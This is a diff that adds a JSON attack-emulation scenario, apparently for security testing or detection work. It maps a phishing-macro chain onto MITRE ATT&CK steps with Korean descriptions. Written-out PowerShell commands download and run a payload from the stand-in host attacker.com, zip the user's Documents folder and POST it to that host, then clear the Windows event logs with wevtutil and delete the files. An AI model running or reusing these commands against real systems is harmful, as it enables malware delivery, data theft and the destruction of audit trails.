@@ -1,0 +1,118 @@
+{
+  "scenario_id": "case_phishing_001_v2",
+  "scenario_name": "phishing_based_data_exfiltration_enhanced",
+  "description": "피싱 문서를 통한 매크로 실행 → 인코딩 PowerShell → 페이로드 다운로드/실행 → 데이터 수집 및 유출 → 흔적 제거",
+
+  "attack_mapping": [
+    {
+      "tactic": "Initial Access",
+      "technique_id": "T1566",
+      "technique_name": "Phishing"
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1204",
+      "technique_name": "User Execution"
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter"
+    },
+    {
+      "tactic": "Command and Control",
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer"
+    },
+    {
+      "tactic": "Collection",
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System"
+    },
+    {
+      "tactic": "Exfiltration",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over Command Channel"
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070",
+      "technique_name": "Indicator Removal"
+    }
+  ],
+
+  "actions": [
+    {
+      "action_id": 1,
+      "action_type": "file_open",
+      "technique_id": "T1566",
+      "command": "open phishing_attachment.docx",
+      "target": "C:\\Users\\<USER>\\Downloads\\invoice.docx",
+      "description": "피싱 이메일 첨부파일 열람 (매크로 포함 문서)"
+    },
+    {
+      "action_id": 2,
+      "action_type": "macro_execution",
+      "technique_id": "T1204",
+      "command": "Enable Content (VBA Macro Execution)",
+      "target": "winword.exe",
+      "description": "사용자가 매크로 활성화 버튼 클릭"
+    },
+    {
+      "action_id": 3,
+      "action_type": "powershell_execute",
+      "technique_id": "T1059",
+      "command": "powershell -EncodedCommand (payload 다운)",
+      "target": "powershell.exe",
+      "description": "인코딩된 PowerShell을 통해 페이로드 다운로드"
+    },
+    {
+      "action_id": 4,
+      "action_type": "file_download",
+      "technique_id": "T1105",
+      "command": "Invoke-WebRequest http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe",
+      "target": "http://attacker.com/payload.exe",
+      "description": "외부 C2 서버에서 악성 파일 다운로드"
+    },
+    {
+      "action_id": 5,
+      "action_type": "process_execute",
+      "technique_id": "T1105",
+      "command": "C:\\temp\\payload.exe",
+      "target": "payload.exe",
+      "description": "다운로드된 악성코드 실행"
+    },
+    {
+      "action_id": 6,
+      "action_type": "data_collection",
+      "technique_id": "T1005",
+      "command": "Compress-Archive -Path C:\\Users\\<USER>\\Documents\\* -DestinationPath C:\\temp\\data.zip",
+      "target": "C:\\Users\\<USER>\\Documents\\",
+      "description": "로컬 문서 파일 수집 및 압축"
+    },
+    {
+      "action_id": 7,
+      "action_type": "c2_communication",
+      "technique_id": "T1041",
+      "command": "powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile C:\\temp\\data.zip\"",
+      "target": "http://attacker.com/upload",
+      "description": "압축된 데이터 C2 서버로 유출"
+    },
+    {
+      "action_id": 8,
+      "action_type": "log_cleanup",
+      "technique_id": "T1070",
+      "command": "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
+      "target": "Windows Event Logs",
+      "description": "이벤트 로그 삭제"
+    },
+    {
+      "action_id": 9,
+      "action_type": "file_delete",
+      "technique_id": "T1070",
+      "command": "del C:\\temp\\payload.exe && del C:\\temp\\data.zip",
+      "target": "C:\\temp\\",
+      "description": "악성 파일 및 수집 데이터 삭제"
+    }
+  ]
+}
